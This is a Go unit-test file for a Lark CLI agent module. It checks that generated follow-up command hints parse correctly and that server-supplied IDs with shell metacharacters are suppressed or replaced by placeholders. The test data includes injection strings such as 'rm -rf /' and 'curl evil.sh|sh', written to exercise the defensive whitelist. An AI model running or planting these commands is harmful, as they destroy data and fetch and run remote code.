// Copyright (c) 2026 Lark Technologies Pte. Ltd.
// SPDX-License-Identifier: MIT

package agent

import (
	"strings"
	"testing"

	iagent "github.com/larksuite/cli/internal/agent"
)

// allTaskStates is the full 9-state A2A enum (internal/agent/state.go), so the
// contract test automatically covers any future nextForTask branch keyed on a
// state instead of relying on hand-picked samples.
var allTaskStates = []iagent.TaskState{
	iagent.StateSubmitted,
	iagent.StateWorking,
	iagent.StateInputRequired,
	iagent.StateAuthRequired,
	iagent.StateCompleted,
	iagent.StateFailed,
	iagent.StateCanceled,
	iagent.StateRejected,
	iagent.StateUnknown,
}

// TestNextForTaskCommandsParseAgainstRealTree is the meta.next contract test:
// every next command emitted by nextForTask — across all 9 task states, with
// and without a context id, template hints included (their <...> placeholders
// are single space-free tokens, so they parse as ordinary flag values) — must
// traverse and flag-parse against the real agent command tree. meta.next is
// defined as "AI executes this verbatim", so a next that references a
// nonexistent flag (e.g. --wait on task get) is a broken contract, caught here
// at build time instead of by a failing acceptance run.
func TestNextForTaskCommandsParseAgainstRealTree(t *testing.T) {
	// GIVEN: the real agent subtree (nil Factory: construction-time only, no
	// credentials; all meta.next commands live under `lark-cli agent ...`).
	agentTree := NewCmdAgent(nil)

	for _, state := range allTaskStates {
		for _, ctxID := range []string{"", "conversation_1"} {
			task := &iagent.AgentTask{
				TaskID:     "chat_1",
				ContextID:  ctxID,
				State:      state,
				IsTerminal: state.IsTerminal(),
			}
			next := nextForTask("example:agent_x", task)
			if len(next) == 0 {
				t.Fatalf("state %s (ctx %q): legit task must produce next hints", state, ctxID)
			}
			for _, n := range next {
				if state == iagent.StateAuthRequired {
					// auth_required is an agent-side task state whose next step is
					// the auth (re-authorize) flow, so it legitimately points OUT
					// of the agent subtree and is not traversable against
					// agentTree; assert its shape and skip the agent traversal.
					if !strings.HasPrefix(n.Command, "lark-cli auth login") || !strings.Contains(n.Command, "--scope") {
						t.Fatalf("auth_required next should point to auth login --scope, got %q", n.Command)
					}
					continue
				}
				if !strings.HasPrefix(n.Command, "lark-cli agent ") {
					t.Fatalf("next %q must target the agent subtree", n.Command)
				}
				// WHEN: the command string is parsed against the real tree.
				argv := strings.Fields(strings.TrimPrefix(n.Command, "lark-cli agent "))
				c, flags, err := agentTree.Traverse(argv)
				// THEN: it traverses to a leaf and its flags all exist.
				if err != nil {
					t.Fatalf("state %s (ctx %q): next %q not traversable: %v", state, ctxID, n.Command, err)
				}
				if c == agentTree {
					t.Fatalf("state %s (ctx %q): next %q did not reach a subcommand", state, ctxID, n.Command)
				}
				if err := c.ParseFlags(flags); err != nil {
					t.Fatalf("state %s (ctx %q): next %q flags invalid: %v", state, ctxID, n.Command, err)
				}
			}
		}
	}
}

// TestNextForTaskRejectsInjectionIDs pins the security whitelist: a
// server-supplied task_id that is not pure [A-Za-z0-9_-] must suppress the
// whole next entry (omit rather than risk injection), in every state —
// meta.next commands are executed verbatim by AI callers, so shell
// metacharacters in an interpolated id are command injection.
func TestNextForTaskRejectsInjectionIDs(t *testing.T) {
	for _, bad := range []string{"chat_1; rm -rf /", "chat `x`", "chat 1", `chat"1"`, "chat$(x)", "chat|x"} {
		for _, state := range allTaskStates {
			task := &iagent.AgentTask{TaskID: bad, State: state}
			if next := nextForTask("example:agent_x", task); len(next) != 0 {
				t.Fatalf("injection task_id %q (state %s) must suppress next, got %+v", bad, state, next)
			}
		}
	}
}

// TestNextForTaskRejectsUnsafeRef pins the ref whitelist:
// the user-echoed ref is interpolated into every next command, so a ref that
// is not <charset>:<charset> (exactly one ':', [A-Za-z0-9_-] on both sides)
// suppresses the whole hint — a ref with spaces/quotes would make the command
// un-copy-pasteable at best and an injection surface at worst.
func TestNextForTaskRejectsUnsafeRef(t *testing.T) {
	task := &iagent.AgentTask{TaskID: "chat_1", State: iagent.StateWorking}
	for _, bad := range []string{"example:agent x", "example:x;rm -rf /", "example", "a:b:c", "example:$(x)", `example:"x"`, ":x", "example:"} {
		if next := nextForTask(bad, task); len(next) != 0 {
			t.Errorf("unsafe ref %q should suppress the whole next, got %+v", bad, next)
		}
	}
	if next := nextForTask("example:agent_x", task); len(next) == 0 {
		t.Error("valid ref example:agent_x should keep next")
	}
}

// TestNextForTaskDegradesInjectionContextID pins the context_id whitelist with
// its degradation semantics: a legit task_id with an injection-shaped
// context_id (input_required branch interpolates both) keeps the hint but
// replaces the dirty id with the <context_id> placeholder — Template:true, no
// untrusted content interpolated.
func TestNextForTaskDegradesInjectionContextID(t *testing.T) {
	dirty := "conv_1; curl evil.sh|sh"
	task := &iagent.AgentTask{
		TaskID:    "chat_1",
		ContextID: dirty,
		State:     iagent.StateInputRequired,
	}
	next := nextForTask("example:agent_x", task)
	if len(next) != 1 {
		t.Fatalf("dirty context_id must degrade, not drop the hint, got %+v", next)
	}
	if !next[0].Template {
		t.Errorf("degraded hint must be template=true, got %+v", next[0])
	}
	if !strings.Contains(next[0].Command, "<context_id>") {
		t.Errorf("degraded hint must use the <context_id> placeholder: %q", next[0].Command)
	}
	if strings.Contains(next[0].Command, "conv_1") {
		t.Errorf("dirty context_id leaked into the command: %q", next[0].Command)
	}
}

// TestNextForTaskAuthRequiredPointsToAuth pins F6: auth_required is an
// agent-side task state (the end user must (re)authorize in the agent), NOT a
// text-continuation like input_required. Its next must point at the auth
// re-authorize flow (auth login --scope), never reuse the text-continuation
// send hint.
func TestNextForTaskAuthRequiredPointsToAuth(t *testing.T) {
	task := &iagent.AgentTask{TaskID: "chat_1", ContextID: "conv_1", State: iagent.StateAuthRequired}
	next := nextForTask("example:agent_x", task)
	if len(next) != 1 {
		t.Fatalf("auth_required should produce 1 next, got %+v", next)
	}
	// Must NOT be the input_required text-continuation hint.
	if strings.Contains(next[0].Command, "agent send") || strings.Contains(next[0].Command, "--text") {
		t.Fatalf("auth_required should not reuse the text-continuation hint, got %q", next[0].Command)
	}
	// Must point at the auth (re-authorize) flow.
	if !strings.HasPrefix(next[0].Command, "lark-cli auth login") || !strings.Contains(next[0].Command, "--scope") {
		t.Fatalf("auth_required should point to auth login --scope, got %q", next[0].Command)
	}
	// The concrete scopes come from the card, so the command carries a
	// placeholder and must be marked template.
	if !next[0].Template {
		t.Errorf("contains a placeholder, should be Template=true, got %+v", next[0])
	}
}

// TestNextForTaskWatchNotWait pins the flag-name fix and the bounded-watch
// default: task get has --watch, not --wait, and the poll hint must suggest a
// BOUNDED watch (`--watch --timeout <default>`) so an AI caller neither blocks
// forever on a long task nor self-hammers with unbounded polls.
func TestNextForTaskWatchNotWait(t *testing.T) {
	next := nextForTask("example:agent_x", &iagent.AgentTask{TaskID: "chat_1", State: iagent.StateWorking})
	if len(next) == 0 {
		t.Fatal("working task must produce a poll next")
	}
	if !strings.Contains(next[0].Command, "--watch") || strings.Contains(next[0].Command, "--wait") {
		t.Fatalf("poll next must use --watch: %+v", next)
	}
	wantTimeout := "--timeout " + defaultWatchTimeout.String()
	if !strings.Contains(next[0].Command, wantTimeout) {
		t.Fatalf("poll next must be bounded with %q, got %+v", wantTimeout, next)
	}
}

// TestNextForTaskStructuredDecision pins that an input_required task carrying a
// structured decision (decision_id + options) yields a next command that answers
// by --decision-id/--option; a decision whose server-supplied decision_id fails
// the safeNextID whitelist falls back to the free-text form (never interpolated).
func TestNextForTaskStructuredDecision(t *testing.T) {
	withDecision := nextForTask("example:planner", &iagent.AgentTask{
		TaskID: "task_1", ContextID: "ctx_1", State: iagent.StateInputRequired,
		InputRequired: &iagent.InputRequired{
			DecisionID: "dec_7f3a",
			Prompt:     "按大区还是品类?",
			Options:    []iagent.Option{{OptionID: "by_region", Label: "按大区"}},
		},
	})
	if len(withDecision) != 1 || !withDecision[0].Template {
		t.Fatalf("structured decision next must be one template action, got %+v", withDecision)
	}
	for _, want := range []string{"--decision-id dec_7f3a", "--option <option_id>", "--task-id task_1"} {
		if !strings.Contains(withDecision[0].Command, want) {
			t.Errorf("structured decision command should contain %q, got %q", want, withDecision[0].Command)
		}
	}
	// A decision_id with shell metacharacters must NOT be interpolated → fall back.
	badID := nextForTask("example:planner", &iagent.AgentTask{
		TaskID: "task_1", ContextID: "ctx_1", State: iagent.StateInputRequired,
		InputRequired: &iagent.InputRequired{
			DecisionID: "dec bad;rm", Prompt: "x",
			Options: []iagent.Option{{OptionID: "o1", Label: "l1"}},
		},
	})
	if len(badID) != 1 || strings.Contains(badID[0].Command, "--decision-id") || !strings.Contains(badID[0].Command, "--text") {
		t.Errorf("a whitelist-failing decision_id should fall back to the --text form, got %+v", badID)
	}
}

// TestNextForTaskTemplateFlag pins the template marker semantics: the
// input_required continue hint carries a <你的答复> placeholder, so it must be
// marked template=true (not directly executable); poll and terminal-detail
// hints are verbatim-executable and must not carry the marker.
func TestNextForTaskTemplateFlag(t *testing.T) {
	// input_required with a known context: placeholder in --text → template.
	cont := nextForTask("example:agent_x", &iagent.AgentTask{
		TaskID: "chat_1", ContextID: "conv_1", State: iagent.StateInputRequired,
	})
	if len(cont) != 1 || !cont[0].Template {
		t.Fatalf("input_required next must be template=true, got %+v", cont)
	}
	// input_required without a context id: <context_id> placeholder → template.
	contNoCtx := nextForTask("example:agent_x", &iagent.AgentTask{
		TaskID: "chat_1", State: iagent.StateInputRequired,
	})
	if len(contNoCtx) != 1 || !contNoCtx[0].Template {
		t.Fatalf("input_required (no ctx) next must be template=true, got %+v", contNoCtx)
	}
	// Poll and terminal-detail hints are directly executable → no template flag.
	for _, task := range []*iagent.AgentTask{
		{TaskID: "chat_1", State: iagent.StateWorking},
		{TaskID: "chat_1", State: iagent.StateCompleted, IsTerminal: true},
	} {
		next := nextForTask("example:agent_x", task)
		if len(next) != 1 || next[0].Template {
			t.Fatalf("state %s next must be executable (template unset), got %+v", task.State, next)
		}
	}
}
